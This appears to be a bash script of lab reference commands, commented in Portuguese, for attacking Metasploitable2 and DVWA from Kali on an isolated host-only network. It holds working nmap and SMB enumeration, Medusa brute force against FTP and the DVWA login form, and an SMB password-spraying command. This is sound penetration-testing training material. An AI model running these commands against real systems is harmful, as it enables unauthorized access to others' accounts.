#!/bin/bash
# ==============================================================
# Comandos de referência do laboratório
# Ataque de Kali Linux (atacante) -> Metasploitable2 / DVWA (alvo)
# Ambiente: rede host-only isolada no VirtualBox
#
# IPs de exemplo (ajuste para os IPs reais das suas VMs):
#   KALI_IP=192.168.56.10
#   ALVO_IP=192.168.56.20
# ==============================================================

ALVO_IP="192.168.56.20"
USUARIOS="../wordlists/usuarios.txt"
SENHAS="../wordlists/senhas.txt"

# --------------------------------------------------------------
# 0. Reconhecimento inicial (sempre o primeiro passo)
# --------------------------------------------------------------
echo "[*] Varredura de portas e serviços no alvo..."
nmap -sV -p 21,22,80,139,445 "$ALVO_IP"

# --------------------------------------------------------------
# 1. Força bruta em FTP com Medusa
# --------------------------------------------------------------
echo "[*] Cenário 1: Brute force FTP"
medusa -h "$ALVO_IP" -U "$USUARIOS" -P "$SENHAS" -M ftp -t 4

# Alternativa com Hydra (comparação de ferramentas)
# hydra -L "$USUARIOS" -P "$SENHAS" ftp://"$ALVO_IP"

# --------------------------------------------------------------
# 2. Ataque em formulário web de login (DVWA) com Medusa
# --------------------------------------------------------------
echo "[*] Cenário 2: Brute force no formulário de login do DVWA"
# Ajuste os parâmetros do form (F=falha) conforme o DVWA inspecionado no navegador
medusa -h "$ALVO_IP" -U "$USUARIOS" -P "$SENHAS" \
  -M http -m DIR:/dvwa/login.php \
  -m FORM:"username=^USER^&password=^PASS^&Login=Login:F=Login failed"

# --------------------------------------------------------------
# 3. SMB: enumeração de usuários + password spraying
# --------------------------------------------------------------
echo "[*] Cenário 3: Enumeração SMB"
nmap --script smb-enum-users -p 445 "$ALVO_IP"
smbclient -L "//$ALVO_IP/" -N

echo "[*] Cenário 3: Password spraying em SMB (1 senha comum x vários usuários)"
medusa -h "$ALVO_IP" -U "$USUARIOS" -p "senha123" -M smbnt

echo "[*] Fim da execução. Capture as evidências em /images conforme for executando."
